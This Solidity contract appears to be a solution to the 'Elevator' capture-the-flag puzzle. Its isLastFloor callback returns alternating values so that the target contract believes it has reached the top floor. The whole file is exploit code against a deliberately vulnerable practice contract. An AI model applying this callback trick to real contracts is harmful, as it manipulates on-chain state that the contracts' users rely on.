// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Elevator} from "./Elevator.sol";
contract AttackerElevator {
    bool public toggle =true;
    Elevator elevator;
    function isLastFloor(uint) external returns (bool){
        toggle = !toggle;
        return toggle;
    }
    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function goTotop() public {
        elevator.goTo(100);
    }


    function getTop() public view returns(bool){
        return elevator.top();
    }
   

}
